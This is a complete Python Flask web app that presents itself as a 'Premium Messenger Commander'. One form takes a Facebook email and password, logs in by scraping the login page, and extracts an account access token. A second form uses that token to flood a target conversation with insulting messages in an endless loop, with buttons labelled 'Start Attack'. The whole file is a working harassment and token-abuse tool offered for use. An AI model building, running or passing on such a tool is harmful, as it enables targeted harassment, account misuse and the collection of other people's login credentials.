import requests
import re
import time
import random
import string
from flask import Flask, request, render_template_string
from threading import Thread, Event

app = Flask(__name__)

# --- Global Logic ---
stop_events = {}

def get_fb_token_v3(username, password):
    """Enhanced Token Extractor with deeper regex and error handling."""
    session = requests.Session()
    headers = {
        'authority': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }
    try:
        # Step 1: Initial Page
        res1 = session.get('https://m.facebook.com/', headers=headers)
        lsd = re.search('name="lsd" value="(.*?)"', res1.text)
        jazoest = re.search('name="jazoest" value="(.*?)"', res1.text)
        
        if not lsd or not jazoest:
            return {"status": "error", "msg": "Facebook blocked the initial request. Try again later."}

        # Step 2: Login
        payload = {
            'lsd': lsd.group(1), 'jazoest': jazoest.group(1),
            'email': username, 'pass': password, 'login': 'Log In'
        }
        res2 = session.post('https://m.facebook.com/login/device-based/regular/login/', data=payload, headers=headers)
        
        if 'c_user' in session.cookies.get_dict():
            # Step 3: Extract from Business Manager (The most stable way for EAAG)
            token_page = session.get('https://business.facebook.com/business_locations', headers=headers)
            token_match = re.search('(EAAG\w+)', token_page.text)
            if token_match:
                return {"status": "success", "token": token_match.group(1)}
            return {"status": "error", "msg": "Login success, but token hidden by FB. Extract manually."}
        else:
            return {"status": "error", "msg": "Login Failed. Check credentials or 2FA."}
    except Exception as e:
        return {"status": "error", "msg": f"System Error: {str(e)}"}

def start_messaging(token, thread_id, hater, speed, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set(): break
            url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
            payload = {'access_token': token, 'message': f"{hater} {msg}"}
            try:
                requests.post(url, data=payload)
            except: pass
            time.sleep(speed)

# --- THE ULTRA PREMIUM UI ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AHMAD ALI SAFDAR | V3 PRO</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: #050505;
            color: #ffffff;
            font-family: 'Poppins', sans-serif;
            overflow-x: hidden;
        }
        .bg-animate {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            z-index: -1;
            opacity: 0.6;
        }
        .container { max-width: 500px; padding-top: 50px; }
        .premium-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 25px;
            padding: 30px;
            backdrop-filter: blur(20px);
            box-shadow: 0 0 40px rgba(0, 242, 254, 0.1);
            margin-bottom: 30px;
        }
        .neon-glow {
            color: #00f2fe;
            text-shadow: 0 0 15px #00f2fe;
            font-weight: 900;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        .form-control {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 15px;
        }
        .form-control:focus {
            background: rgba(255, 255, 255, 0.1);
            border-color: #00f2fe;
            box-shadow: 0 0 10px #00f2fe;
            color: #fff;
        }
        .btn-launch {
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            border: none; border-radius: 12px; padding: 12px;
            font-weight: bold; text-transform: uppercase; transition: 0.3s;
        }
        .btn-launch:hover { transform: scale(1.02); box-shadow: 0 0 20px #4facfe; }
        .footer-text { font-size: 0.8rem; color: #666; margin-top: 20px; }
        .badge-id { background: #00f2fe; color: #000; font-weight: bold; border-radius: 5px; padding: 2px 8px; }
    </style>
</head>
<body>
    <div class="bg-animate"></div>
    <div class="container">
        <div class="text-center mb-4">
            <h2 class="neon-glow">♛ AHMAD ALI SAFDAR ♛</h2>
            <p class="small text-secondary">Premium Messenger Commander v3.0</p>
        </div>

        <div class="premium-card">
            <h6 class="mb-3 text-info"><i class="fas fa-fingerprint me-2"></i>Token Extractor</h6>
            <form action="/extract" method="POST">
                <input type="text" name="u" class="form-control" placeholder="Phone/Email" required>
                <input type="password" name="p" class="form-control" placeholder="Password" required>
                <button type="submit" class="btn btn-launch w-100">Fetch Token</button>
            </form>
            {% if res %}
            <div class="mt-3 p-3 rounded bg-black small border border-info text-break">
                <span class="text-info">Result:</span> {{ res }}
            </div>
            {% endif %}
        </div>

        <div class="premium-card">
            <h6 class="mb-3 text-info"><i class="fas fa-crosshairs me-2"></i>Launch Interface</h6>
            <form action="/run" method="POST" enctype="multipart/form-data">
                <input type="text" name="token" class="form-control" placeholder="Paste Access Token" required>
                <input type="text" name="tid" class="form-control" placeholder="Target Convo ID" required>
                <input type="text" name="hater" class="form-control" placeholder="Hater Name" required>
                <input type="number" name="speed" class="form-control" placeholder="Delay (Seconds)" required>
                <label class="small text-secondary mb-1">Upload Messages (.txt)</label>
                <input type="file" name="file" class="form-control" required>
                <button type="submit" class="btn btn-launch w-100 mt-2">Start Attack</button>
            </form>
        </div>

        <div class="premium-card text-center p-3">
            <form action="/stop" method="POST" class="d-flex gap-2">
                <input type="text" name="task_id" class="form-control mb-0" placeholder="Task ID">
                <button type="submit" class="btn btn-danger rounded-3">STOP</button>
            </form>
        </div>

        <div class="text-center footer-text">
            <p>MADE WITH ❤️ BY AHMAD KING</p>
            <div class="d-flex justify-content-center gap-3">
                <a href="https://wa.me/+923324661564" class="text-info"><i class="fab fa-whatsapp fa-lg"></i></a>
                <a href="#" class="text-info"><i class="fab fa-facebook fa-lg"></i></a>
            </div>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/extract', methods=['POST'])
def extract():
    u, p = request.form.get('u'), request.form.get('p')
    result = get_fb_token_v3(u, p)
    return render_template_string(HTML_TEMPLATE, res=result.get('token') or result.get('msg'))

@app.route('/run', methods=['POST'])
def run():
    token, tid = request.form.get('token'), request.form.get('tid')
    hater, speed = request.form.get('hater'), int(request.form.get('speed'))
    msgs = request.files['file'].read().decode().splitlines()
    
    task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    stop_events[task_id] = Event()
    
    Thread(target=start_messaging, args=(token, tid, hater, speed, msgs, task_id)).start()
    return f"<body style='background:#000;color:#00f2fe;text-align:center;padding-top:50px;'><h1>ATTACK LAUNCHED!</h1><h3>TASK ID: {task_id}</h3><a href='/' style='color:#fff;'>Go Back</a></body>"

@app.route('/stop', methods=['POST'])
def stop():
    task_id = request.form.get('task_id')
    if task_id in stop_events:
        stop_events[task_id].set()
        return "Task Stopped."
    return "Invalid ID."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
                
